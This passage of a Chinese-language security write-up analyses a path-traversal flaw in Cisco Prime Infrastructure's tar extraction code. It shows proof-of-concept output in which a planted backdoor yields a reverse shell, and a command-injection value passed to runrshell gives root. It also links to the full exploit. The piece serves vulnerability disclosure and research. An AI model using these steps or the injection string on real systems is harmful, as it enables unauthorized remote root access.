    public class FileArchiver
    {
      ...
      public boolean extractArchive(boolean compress, String archveName, InputStream istream, String userDir)
      {
        this.archiveName = archveName;
        this.compressed = compress;
        File destDir = new File(userDir);
        if (istream != null) {
          AesLogImpl.getInstance().trace1(128, "Extract archive from stream  to directory " + userDir);
        } else {
          AesLogImpl.getInstance().trace1(128, "Extract archive " + this.archiveName + " to directory " + userDir);
        }
        if ((!destDir.exists()) && 
          (!destDir.mkdirs()))
        {
          destDir = null;
          AesLogImpl.getInstance().error1(128, "Error while creating destination dir=" + userDir + " Giving up extraction of archive " + this.archiveName);
          return false;
        }
        result = false;
        if (destDir != null) {
          try
          {
            setupReadArchive(istream);                                  // 15
            this.archive.extractContents(destDir);                      // 17
            return true;
          }
以上代码首先会调用[15]处的`setupReadArchive`。这一点非常重要，因为我们会在如下代码[16]处将`archive`变量设置为`TarArchive`类的一个实例。
      private boolean setupReadArchive(InputStream istream)
        throws IOException
      {
        if ((this.archiveName != null) && (istream == null)) {
          try
          {
            this.inStream = new FileInputStream(this.archiveName);
          }
          catch (IOException ex)
          {
            this.inStream = null;
            return false;
          }
        } else {
          this.inStream = istream;
        }
        if (this.inStream != null) {
          if (this.compressed)
          {
            try
            {
              this.inStream = new GZIPInputStream(this.inStream);
            }
            catch (IOException ex)
            {
              this.inStream = null;
            }
            if (this.inStream != null) {
              this.archive = new TarArchive(this.inStream, 10240);              // 16
            }
          }
          else
          {
            this.archive = new TarArchive(this.inStream, 10240);
          }
        }
        if (this.archive != null) {
          this.archive.setDebug(this.debug);
        }
        return this.archive != null;
      }
然后在[17]，代码会在`TarArchive`类上调用`extractContents`。
      extractContents( File destDir )
        throws IOException, InvalidHeaderException
        {
        for ( ; ; )
          {
          TarEntry entry = this.tarIn.getNextEntry();
          if ( entry == null )
            {
            if ( this.debug )
              {
              System.err.println( "READ EOF RECORD" );
              }
            break;
            }
          this.extractEntry( destDir, entry );                      // 18
          }
        }
在[18]处代码提取了`entry`，我们终于看到代码会在没有检查是否存在目录遍历的情况下盲目提取tar压缩文件中的内容。
            try {
              boolean asciiTrans = false;
              FileOutputStream out =
                new FileOutputStream( destFile );                   // 19
              ...
              for ( ; ; )
                {
                int numRead = this.tarIn.read( rdbuf );
                if ( numRead == -1 )
                  break;
                if ( asciiTrans )
                  {
                  for ( int off = 0, b = 0 ; b  
    (+) eg: ./poc.py 192.168.100.123 192.168.100.2:4444
    saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.2:4444
    (+) planted backdoor!
    (+) starting handler on port 4444
    (+) connection from 192.168.100.123
    (+) pop thy shell!
    python -c 'import pty; pty.spawn("/bin/bash")'
    [prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
    sh-4.1# /usr/bin/id
    /usr/bin/id
    uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
大家可以访问[此处](https://srcincite.io/pocs/src-2019-0034.py.txt)下载完整的利用代码。
## 0x06 总结
在代码审计中，这个漏洞已经多次成功逃过了许多安全研究人员的法眼，我认为之所以会出现这种情况，是因为该漏洞只有在配置HA之后，才会由某个组件触发。有些情况下，安全研究人员需要花不少精力才能正确配置好实验环境。
## 0x07 参考资料
  * 